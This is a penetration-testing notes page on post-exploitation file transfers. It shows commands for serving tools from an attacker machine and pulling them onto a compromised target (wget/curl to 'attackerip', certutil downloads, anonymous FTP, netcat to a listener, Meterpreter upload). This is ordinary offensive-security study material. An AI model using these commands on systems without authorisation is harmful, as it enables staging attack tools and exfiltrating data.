# File transfers

Once we gain initial access to our target we may need to upload additional tools to help us elevate privileges or provide easier methods of accessing the machine at a later point.  We might also want to download files from the target for use in our report.  The following list provides a few common techniques for executing file transfers.

### HTTP

On our attacking machine we have two options for serving files.  The first \(preferred\) method is to run the SimpleHTTPServer Python module in the directory that contains the files we want to transfer.

```text
python -m SimpleHTTPServer 80
python3 -m http.server 80
```

Our second option is to use our built in Apache server.  To do this we need start the Apache 2 service.  Once started our files will be served from var/www/html.

```text
systemctl start Apache2 
```

Next, we use our target machine to request the desired filed from the server.  The method varies slightly depending on the OS of the target machine.

#### **Linux**

```text
wget http://sample.com/file.pdf
wget -O report_wget.pdf https://sample.com/report-2013.pdf
    -O saves the file with a different name on the local machine
curl -o file.pdf http://attackerip/file.pdf
axel -a -n 20 -o report_axel.pdf https://sample.com/report.pdf
    -n --used to specify the number of connections
    -a --provides a more concise progress indicator
    -o --used to specify a different name for the downloaded file
```

#### **Windows**

```text
certutil -urlcache -f http://sourceip/file.exe [c:\desired_destination\desired_]name.exe
```

### FTP

Create an FTP server in the directory you are in, on port 21, allow anonymous access:

```text
Python -m pyftpdlib 21
ftp $IPaddressofattacker
```

### Netcat

On receiving machine: `nc -nlvp 4444 > incoming.exe`

On sending machine: `nc – nv 10.11.23.33 4444 < file.exe`

### Meterpreter shell

Upload/download feature

